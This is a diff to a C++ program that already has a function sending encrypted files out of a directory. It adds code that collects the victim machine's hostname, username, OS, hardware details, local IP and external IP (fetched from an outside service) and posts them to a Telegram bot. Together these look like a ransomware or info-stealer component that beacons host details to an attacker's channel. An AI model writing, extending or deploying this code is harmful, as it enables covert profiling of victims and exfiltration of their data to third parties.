@@ -13,6 +13,8 @@
 #include <random>
 #include <chrono>
 #include <curl/curl.h>
+#include <unistd.h>   // for gethostname(), geteuid()
+#include <pwd.h>      // for getpwuid()
 
 namespace fs = std::filesystem;
 using namespace std;
@@ -109,4 +111,123 @@ void sendRandomEncryptedFiles(const string &directory, int maxFiles = 10) {
     }
 
     cout << "[DONE] Sent " << sent << " file(s).\n";
+}
+
+// This part is for sending machine and IP addresses to telegram bot
+
+// Fetch command output
+string getCommandOutput(const string &cmd) {
+    string data;
+    FILE *stream;
+    const int max_buffer = 512;
+    char buffer[max_buffer];
+    stream = popen(cmd.c_str(), "r");
+    if (stream) {
+        while (fgets(buffer, max_buffer, stream) != NULL) {
+            data.append(buffer);
+        }
+        pclose(stream);
+    }
+    return data;
+}
+
+// Callback for cURL response
+size_t writeToString(void *contents, size_t size, size_t nmemb, string *output) {
+    size_t totalSize = size * nmemb;
+    output->append((char *)contents, totalSize);
+    return totalSize;
+}
+
+// Fetch public IP via HTTP
+string getPublicIP() {
+    CURL *curl = curl_easy_init();
+    string response;
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeToString);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+        curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+    }
+    return response.empty() ? "Unavailable" : response;
+}
+
+string gatherFullSystemInfo() {
+    stringstream info;
+
+    // Hostname
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+    info << "🖥 Hostname: " << hostname << "\n";
+
+    // Username
+    struct passwd *pw = getpwuid(geteuid());
+    info << "👤 User: " << (pw ? pw->pw_name : "unknown") << "\n";
+
+    // OS
+    info << "📦 OS: " << getCommandOutput("uname -o");
+    info << "🧱 Kernel: " << getCommandOutput("uname -r");
+
+    // Architecture
+    info << "🔧 Arch: " << getCommandOutput("uname -m");
+
+    // CPU
+    info << "🧠 CPU: " << getCommandOutput("lscpu | grep 'Model name' | awk -F: '{print $2}'");
+
+    // RAM
+    info << "💾 RAM: " << getCommandOutput("free -h | grep Mem:");
+
+    // Disk
+    info << "💽 Disk: " << getCommandOutput("df -h --total | grep total");
+
+    // Battery (optional)
+    string battery = getCommandOutput("acpi -b 2>/dev/null");
+    if (!battery.empty())
+        info << "🔋 Battery: " << battery;
+
+    // Uptime
+    info << "⏱ Uptime: " << getCommandOutput("uptime -p");
+
+    // IPs
+    info << "📡 Local IP: " << getCommandOutput("hostname -I");
+    info << "🌍 External IP: " << getPublicIP() << "\n";
+
+    // Model info (if DMI available)
+    string model = getCommandOutput("cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null");
+    string vendor = getCommandOutput("cat /sys/devices/virtual/dmi/id/sys_vendor 2>/dev/null");
+    if (!vendor.empty() || !model.empty())
+        info << "🧰 Hardware: " << vendor << model;
+
+    // Timestamp
+    time_t now = time(0);
+    info << "🕒 Time: " << ctime(&now);
+
+    return info.str();
+}
+
+void sendMessageToTelegram(const string &message) {
+    CURL *curl = curl_easy_init();
+    if (!curl) return;
+
+    string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+
+    char *escapedMsg = curl_easy_escape(curl, message.c_str(), message.length());
+    if (!escapedMsg) {
+        curl_easy_cleanup(curl);
+        return;
+    }
+
+    string postFields = "chat_id=" + CHAT_ID + "&text=" + escapedMsg;
+
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);
+
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK)
+        cerr << "[FAIL] sendMessage: " << curl_easy_strerror(res) << "\n";
+
+    curl_free(escapedMsg);
+    curl_easy_cleanup(curl);
 }
